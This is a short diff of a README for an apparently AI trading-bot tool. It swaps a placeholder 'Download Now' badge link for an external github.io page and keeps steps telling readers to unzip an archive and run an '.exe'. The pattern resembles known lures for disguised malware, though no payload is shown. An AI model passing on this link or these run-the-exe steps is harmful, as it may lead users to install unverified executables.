@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application or launch via terminal for CLI mode.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://zenbot-trading-bot.github.io/.github/)
 
 ## 📸 Overview
 <img width="1920" height="1440" alt="ai-trading-strategy-setup" src="https://github.com/user-attachments/assets/6b9b87d1-0b84-4b2f-838d-44f3edbf355d" />
